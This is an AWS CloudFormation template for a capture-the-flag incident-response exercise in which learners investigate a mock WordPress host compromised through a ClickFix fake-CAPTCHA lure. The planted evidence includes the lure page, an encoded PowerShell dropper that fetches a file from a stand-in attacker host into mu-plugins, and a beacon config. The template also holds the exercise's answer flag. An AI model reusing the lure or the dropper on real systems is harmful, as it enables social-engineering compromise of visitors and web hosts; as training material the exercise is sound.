AWSTemplateFormatVersion: "2010-09-09"
Description: >
  TenkaCloud Challenge (clickfix-incident). A campaign web host was compromised via
  an ErrTraffic-style ClickFix lure (a fake Turnstile / reCAPTCHA "verification"
  that tricked a visitor into pasting a PowerShell command). The host carries the
  evidence: the fake-verify page, a pseudo PowerShell history log, an egress log,
  and a WordPress mu-plugins persistence artifact. The learner connects via SSM,
  investigates, and recovers the attacker's exfiltrated campaign id (the flag) by
  finding and decoding the persistence artifact. Everything is a harmless mock --
  no real malware, no PowerShell execution, no real C2. delete-stack removes all.

Metadata:
  tenkacloud:
    allowIntentionallyVulnerable: true

Parameters:
  NamePrefix:
    Type: String
    MinLength: 5
    MaxLength: 80
    AllowedPattern: "^tc-[a-z0-9]+(-[a-z0-9]+)+$"
    ConstraintDescription: >
      `tc-{problemSlug}-{teamSlug}` format. The deploy chain injects this value.
    Description: Common prefix attached to all resource names (per-team isolation).
  TenkaCloudAccountId:
    Type: String
    AllowedPattern: "^[0-9]{12}$"
    Description: TenkaCloud operator AWS account ID (passed by deploy chain).
  ExternalId:
    Type: String
    NoEcho: true
    MinLength: 16
    Description: ExternalId for ParticipantViewerRole trust (passed by deploy chain).
  FlagSeed:
    Type: String
    NoEcho: true
    MinLength: 8
    MaxLength: 64
    AllowedPattern: "^[A-Za-z0-9]+$"
    Description: >
      Per-deploy random secret injected by the deploy chain (cfnParameters:
      FlagSeed = __RANDOM_PASSWORD__). Embedded (base64) as the attacker's
      campaign_id inside the persistence artifact, so the flag can only be learned
      by finding and decoding it -- never derived from the public NamePrefix.
  AmiId:
    Type: AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>
    Default: /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-6.1-x86_64
    Description: SSM-backed Amazon Linux 2023 AMI (auto-resolved).
  InstanceType:
    Type: String
    Default: t3.micro
    AllowedValues:
      - t3.micro
      - t3.small
    Description: EC2 instance type for the compromised web host.

Resources:
  Vpc:
    Type: AWS::EC2::VPC
    Properties:
      CidrBlock: 10.70.0.0/16
      EnableDnsSupport: true
      EnableDnsHostnames: true
      Tags:
        - Key: Name
          Value: !Sub "${NamePrefix}-vpc"
        - Key: TenkaCloud:NamePrefix
          Value: !Ref NamePrefix

  PublicSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      VpcId: !Ref Vpc
      CidrBlock: 10.70.1.0/24
      AvailabilityZone: !Select [0, !GetAZs ""]
      MapPublicIpOnLaunch: true
      Tags:
        - Key: Name
          Value: !Sub "${NamePrefix}-public-subnet"
        - Key: TenkaCloud:NamePrefix
          Value: !Ref NamePrefix

  Igw:
    Type: AWS::EC2::InternetGateway
    Properties:
      Tags:
        - Key: Name
          Value: !Sub "${NamePrefix}-igw"
        - Key: TenkaCloud:NamePrefix
          Value: !Ref NamePrefix

  IgwAttach:
    Type: AWS::EC2::VPCGatewayAttachment
    Properties:
      VpcId: !Ref Vpc
      InternetGatewayId: !Ref Igw

  PublicRt:
    Type: AWS::EC2::RouteTable
    Properties:
      VpcId: !Ref Vpc
      Tags:
        - Key: Name
          Value: !Sub "${NamePrefix}-public-rt"
        - Key: TenkaCloud:NamePrefix
          Value: !Ref NamePrefix

  PublicRoute:
    Type: AWS::EC2::Route
    DependsOn: IgwAttach
    Properties:
      RouteTableId: !Ref PublicRt
      DestinationCidrBlock: 0.0.0.0/0
      GatewayId: !Ref Igw

  PublicRtAssoc:
    Type: AWS::EC2::SubnetRouteTableAssociation
    Properties:
      RouteTableId: !Ref PublicRt
      SubnetId: !Ref PublicSubnet

  # No inbound: the learner investigates the host via SSM Session Manager. The web
  # server only needs to be reachable from localhost (the evidence is on disk).
  WebHostSg:
    Type: AWS::EC2::SecurityGroup
    Properties:
      GroupName: !Sub "${NamePrefix}-webhost-sg"
      GroupDescription: Compromised campaign web host. SSM-only; no public inbound.
      VpcId: !Ref Vpc
      SecurityGroupEgress:
        - IpProtocol: -1
          CidrIp: 0.0.0.0/0
          Description: Outbound to AWS APIs (SSM) and the package mirror.
      Tags:
        - Key: Name
          Value: !Sub "${NamePrefix}-webhost-sg"
        - Key: TenkaCloud:NamePrefix
          Value: !Ref NamePrefix

  InstanceRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              Service: ec2.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore

  InstanceProfile:
    Type: AWS::IAM::InstanceProfile
    Properties:
      InstanceProfileName: !Sub "${NamePrefix}-instance-profile"
      Roles:
        - !Ref InstanceRole

  ParticipantViewerRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              AWS: !Sub "arn:aws:iam::${TenkaCloudAccountId}:root"
            Action: sts:AssumeRole
            Condition:
              StringEquals:
                sts:ExternalId: !Ref ExternalId
      MaxSessionDuration: 3600
      # Participant access baseline (same across the catalog). `aws login` needs
      # SignInLocalDevelopmentAccess; the 7-action CloudShell allow-list follows.
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/SignInLocalDevelopmentAccess
      Policies:
        - PolicyName: ProblemSpecific
          PolicyDocument:
            Version: "2012-10-17"
            Statement:
              - Sid: OpenCloudShellSession
                Effect: Allow
                Action:
                  - cloudshell:CreateEnvironment
                  - cloudshell:CreateSession
                  - cloudshell:GetEnvironmentStatus
                  - cloudshell:StartEnvironment
                  - cloudshell:StopEnvironment
                  - cloudshell:DeleteEnvironment
                  - cloudshell:PutCredentials
                Resource: "*"
              - Sid: ConsoleSelfIdentity
                Effect: Allow
                Action:
                  - sts:GetCallerIdentity
                Resource: "*"
              - Sid: ConsoleEc2Describe
                Effect: Allow
                Action:
                  - ec2:Describe*
                Resource: "*"
                Condition:
                  StringEquals:
                    aws:ResourceTag/TenkaCloud:NamePrefix: !Ref NamePrefix
              - Sid: ConsoleEc2Metadata
                Effect: Allow
                Action:
                  - ec2:DescribeRegions
                  - ec2:DescribeAvailabilityZones
                  - ec2:DescribeAccountAttributes
                  - ec2:DescribeInstances
                Resource: "*"
              # The flag is planted inside the host (and thus appears in UserData).
              # Deny reading UserData back so the only path to it is investigating
              # the host. Explicit Deny overrides any allow.
              - Sid: DenyUserDataReadback
                Effect: Deny
                Action:
                  - ec2:DescribeInstanceAttribute
                Resource: "*"
              - Sid: ReadOwnSsmParameters
                Effect: Allow
                Action:
                  - ssm:GetParameter
                  - ssm:GetParameters
                  - ssm:GetParametersByPath
                Resource: !Sub "arn:aws:ssm:*:*:parameter/${NamePrefix}/*"
              - Sid: DescribeOwnParameters
                Effect: Allow
                Action: ssm:DescribeParameters
                Resource: "*"
              - Sid: StartSessionToWebHost
                Effect: Allow
                Action:
                  - ssm:StartSession
                Resource:
                  - !Sub "arn:aws:ec2:${AWS::Region}:${AWS::AccountId}:instance/${WebHost}"
                  - !Sub "arn:aws:ssm:${AWS::Region}:${AWS::AccountId}:document/SSM-SessionManagerRunShell"
                  - !Sub "arn:aws:ssm:${AWS::Region}::document/SSM-SessionManagerRunShell"
              - Sid: TerminateOwnSession
                Effect: Allow
                Action:
                  - ssm:TerminateSession
                Resource: !Sub "arn:aws:ssm:${AWS::Region}:${AWS::AccountId}:session/${NamePrefix}*"
              # Deliberately NO cloudformation:DescribeStacks -- the AnswerFlag
              # Output must not be readable; the flag is recovered by investigation.

  WebHost:
    Type: AWS::EC2::Instance
    Properties:
      ImageId: !Ref AmiId
      InstanceType: !Ref InstanceType
      IamInstanceProfile: !Ref InstanceProfile
      SubnetId: !Ref PublicSubnet
      SecurityGroupIds:
        - !Ref WebHostSg
      MetadataOptions:
        HttpTokens: required
        HttpPutResponseHopLimit: 1
        HttpEndpoint: enabled
      Tags:
        - Key: Name
          Value: !Sub "${NamePrefix}-webhost"
        - Key: TenkaCloud:Problem
          Value: clickfix-incident
        - Key: TenkaCloud:NamePrefix
          Value: !Ref NamePrefix
      UserData:
        Fn::Base64: !Sub |
          #!/bin/bash
          set -euxo pipefail
          dnf install -y nginx php-cli || dnf install -y nginx php || dnf install -y nginx || true

          WROOT=/var/www/campaign
          MU=$WROOT/wp-content/mu-plugins
          mkdir -p "$MU" /var/log/clickfix
          chown -R ec2-user:ec2-user /var/www /var/log/clickfix

          # ---- the fake-verification (ClickFix) lure the visitors saw ----
          cat > "$WROOT/verify.html" <<'HTML'
          <!doctype html><meta charset=utf-8><title>Verification required</title>
          <body style="font-family:system-ui;max-width:520px;margin:80px auto;text-align:center">
          <h2>Verify you are human</h2>
          <p>Cloudflare is checking your connection. To complete verification, press
          <b>Win + R</b>, paste the code below, and press Enter.</p>
          <pre style="background:#f3f3f3;padding:12px;text-align:left">powershell -e &lt;base64&gt;  # "verification token"</pre>
          <p style="color:#888;font-size:12px">(This is the malicious ClickFix lure -- a real reCAPTCHA/Turnstile NEVER asks you to run a command.)</p>
          </body>
          HTML
          cat > "$WROOT/index.html" <<'HTML'
          <!doctype html><title>Spring Campaign</title><h1>Spring Campaign 2026</h1>
          <p>Thanks for visiting! Some users were redirected to a "verification" step.</p>
          HTML

          # ---- pseudo PowerShell history: what the lured visitor actually ran ----
          # (mock evidence only -- nothing is executed). The decoded command drops a
          # WordPress mu-plugin for persistence.
          DROP_CMD='iwr https://verify-cdn-cache.example/c.txt -OutFile $env:TEMP\c.txt; copy $env:TEMP\c.txt /var/www/campaign/wp-content/mu-plugins/cache-helper.php'
          DROP_B64=$(printf '%s' "$DROP_CMD" | base64 -w0)
          cat > /var/log/clickfix/powershell_history.log <<LOG
          2026-06-18T13:42:01Z  user=guest  host=KIOSK-03
          2026-06-18T13:42:07Z  powershell.exe -NoProfile -EncodedCommand $DROP_B64
          2026-06-18T13:42:09Z  [decoded] $DROP_CMD
          2026-06-18T13:42:12Z  wrote: /var/www/campaign/wp-content/mu-plugins/cache-helper.php
          LOG

          # ---- pseudo egress log: periodic beacons to the attacker C2 ----
          cat > /var/log/clickfix/egress.log <<'LOG'
          13:43:00 OUT 443 verify-cdn-cache.example  /beacon  ua=wp-cron  bytes=212
          13:58:00 OUT 443 verify-cdn-cache.example  /beacon  ua=wp-cron  bytes=212
          14:13:00 OUT 443 verify-cdn-cache.example  /beacon  ua=wp-cron  bytes=212
          LOG

          # ---- legitimate mu-plugins (decoys) ----
          cat > "$MU/healthcheck.php" <<'PHP'
          <?php /* ops: lightweight uptime ping, added by platform team */
          add_action('init', function () { /* no-op */ });
          PHP
          cat > "$MU/seo-tweaks.php" <<'PHP'
          <?php /* marketing: canonical + sitemap tweaks */
          add_filter('wp_sitemaps_enabled', '__return_true');
          PHP

          # ---- the persistence artifact: carries the exfiltrated campaign id (flag),
          #      base64-encoded so it is not greppable in plaintext ----
          FLAG="TC{${FlagSeed}}"
          CFG=$(printf '{"c2":"verify-cdn-cache.example","campaign_id":"%s","beacon_seconds":900,"persist":"mu-plugin"}' "$FLAG")
          ENC=$(printf '%s' "$CFG" | base64 -w0)
          cat > "$MU/cache-helper.php" <<'PHP'
          <?php
          /* perf cache helper - autoloaded (DO NOT EDIT) */
          $__c = json_decode(base64_decode("__ENC__"), true);
          // beacon $__c['campaign_id'] to $__c['c2'] every $__c['beacon_seconds']s via wp-cron
          if (function_exists('add_action')) { add_action('init', function () {}); }
          PHP
          sed -i "s|__ENC__|$ENC|" "$MU/cache-helper.php"
          chown -R ec2-user:ec2-user /var/www /var/log/clickfix

          cat > /etc/motd <<'MOTD'
          TenkaCloud clickfix-incident -- compromised campaign web host
          Visitors saw a fake "verification" screen and some ran a pasted command.
          Investigate:
            /var/www/campaign/verify.html              (the ClickFix lure)
            /var/log/clickfix/powershell_history.log   (what the visitor ran)
            /var/log/clickfix/egress.log               (beacons to the C2)
            /var/www/campaign/wp-content/mu-plugins/    (WordPress persistence)
          Recover the attacker's exfiltrated campaign id (TC{...}) and submit it.
          MOTD

  BriefingParameter:
    Type: AWS::SSM::Parameter
    Properties:
      Name: !Sub "/${NamePrefix}/briefing"
      Type: String
      Value: !Sub >-
        A campaign web host was compromised by an ErrTraffic-style ClickFix lure: a
        fake Turnstile/reCAPTCHA page told visitors to press Win+R and paste a
        PowerShell command, which dropped a WordPress mu-plugins persistence file.
        Connect with `aws ssm start-session --target ${WebHost}`, read
        /var/log/clickfix/powershell_history.log and the egress log to trace what
        was installed, find the rogue file under
        /var/www/campaign/wp-content/mu-plugins/, and decode its base64 config to
        recover the attacker's campaign_id (the flag TC{...}). Everything is a
        harmless mock -- no real malware runs.
      Description: !Sub "TenkaCloud clickfix-incident briefing for ${NamePrefix}."
      Tier: Standard

Outputs:
  WebHostInstanceId:
    Description: Compromised host instance id -- connect with `aws ssm start-session --target <this>`.
    Value: !Ref WebHost
  SsmStartSessionCommand:
    Description: Connect to the compromised host via SSM Session Manager.
    Value: !Sub "aws ssm start-session --target ${WebHost}"
  BriefingParameterName:
    Description: SSM Parameter holding the task briefing.
    Value: !Ref BriefingParameter
  # Canonical answer, scoring engine only (no DescribeStacks granted to the player).
  AnswerFlag:
    Description: Flag the learner submits after decoding the persistence artifact.
    Value: !Sub "TC{${FlagSeed}}"
  NamePrefix:
    Description: Common resource prefix this stack used.
    Value: !Ref NamePrefix
  ParticipantViewerRoleArn:
    Description: Role ARN competitors AssumeRole to access their own stack via AWS Console.
    Value: !GetAtt ParticipantViewerRole.Arn
